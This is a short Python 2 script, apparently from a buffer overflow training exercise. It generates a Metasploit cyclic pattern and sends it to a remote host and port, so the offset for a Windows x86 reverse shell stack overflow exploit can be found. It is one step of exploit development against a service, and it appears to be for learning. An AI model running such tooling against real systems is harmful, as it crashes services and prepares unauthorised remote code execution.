#!/usr/bin/env python

# Generates and sends a unique pattern to a service as part of the process in
# developing a Windows x86 reverse shell stack buffer overflow
# Saved Return Pointer overwrite exploit.
# Uses Metasploit's msf-pattern_create tool.
# Parameters are saved in params.py for persistence.
# Delete params.py and params.pyc to reset them; or simply edit params.py
#
# Written by y0k3L
# Credit to Justin Steven and his 'dostackbufferoverflowgood' tutorial
# https://github.com/justinsteven/dostackbufferoverflowgood

import socket, subprocess, functions

# get parameters
RHOST = functions.getRhost()
RPORT = functions.getRport()
buf_totlen = functions.getBufTotlen()

print "RHOST=%s; RPORT=%s; buf_totlen=%s" % (RHOST, RPORT, buf_totlen)

cmd = ["msf-pattern_create", "-l", str(buf_totlen)]

# print ' '.join(cmd)

print "Generating unique pattern..."
# generate unique pattern with msf-pattern_create
pattern = subprocess.check_output(cmd)

print "Pattern:\n" + pattern.decode("utf-8")

sent = functions.sendBuffer(RHOST, RPORT, pattern)

if sent is 0:
    print "To determine offset, execute: "
    print "msf-pattern_offset -q <EIP value>"
    print "Then enter offset at next step."
